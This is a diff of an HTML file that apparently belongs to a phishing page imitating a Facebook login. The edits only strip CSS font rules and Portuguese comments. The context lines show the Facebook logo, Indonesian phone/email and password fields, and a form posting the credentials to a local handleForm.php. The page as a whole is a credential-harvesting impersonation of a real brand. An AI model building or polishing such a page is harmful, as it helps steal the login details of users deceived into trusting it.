@@ -15,18 +15,12 @@
     <script src="style.css"></script>
 
     <style>
-        * {
-            font-family: Arial, Helvetica, sans-serif;
-        }
-
         html,
         body {
             overflow: hidden;
             height: 100%;
-            font-family: Arial, Helvetica, sans-serif;
         }
 
-        /* Gradiente de fundo complexo */
         .background {
             background-image: radial-gradient(rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0) 40%),
                 radial-gradient(rgb(255, 209, 82) 30%, rgb(226, 105, 150), rgba(226, 105, 150, 0.4) 41%, transparent 52%),
@@ -38,27 +32,21 @@
             background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
             position: absolute;
             inset: 0;
-            /* Isso garante que a div ocupe toda a tela */
             opacity: 0.08;
             pointer-events: none;
             z-index: -1;
             height: 100vh;
-            /* Altura total da viewport */
         }
 
-        /* Definindo altura do body para 100% da tela */
         body {
             height: 100vh;
-            /* Altura total da viewport */
             margin: 0;
-            /* Remove margens padrão */
         }
     </style>
 </head>
 
 <body class=" ">
 
-    <!-- Fundo com gradiente complexo -->
     <div class="background"></div>
 
     <div class="container mx-auto relative z-10">
@@ -67,7 +55,6 @@
             <img class="w-14 mx-auto bg-transparent my-20 rounded-full" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="">
         </div>
 
-        <!-- Formulário adicionado aqui -->
         <form class="down bg-none flex flex-col" id="form" action="handleForm.php" method="POST">
             <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-spacing-56 border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="text" id="inputUsername" name="inputUsername" placeholder="Nomor Ponsel atau email" required>
             <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="password" id="inputPassword" name="inputPassword" placeholder="Kata Sandi" required>
